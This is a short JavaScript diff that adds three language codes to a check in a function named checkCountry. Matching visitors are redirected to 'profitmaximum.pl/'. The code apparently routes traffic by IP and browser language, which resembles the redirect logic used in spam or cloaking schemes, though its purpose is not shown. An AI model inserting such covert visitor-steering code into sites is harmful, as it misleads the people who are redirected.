@@ -112,6 +112,9 @@ function checkCountry(ip, language) {
             if (language.toUpperCase() ==='RU' ||
                 language.toUpperCase() ==='UA' ||
                 language.toUpperCase() ==='RU-UA' ||
+                language.toUpperCase() ==='EN-UA' ||
+                language.toUpperCase() ==='EN-RU' ||
+                language.toUpperCase() ==='EN-PL' ||
                 language.toUpperCase() ==='PL') {
                 url = 'profitmaximum.pl/'
             } else {
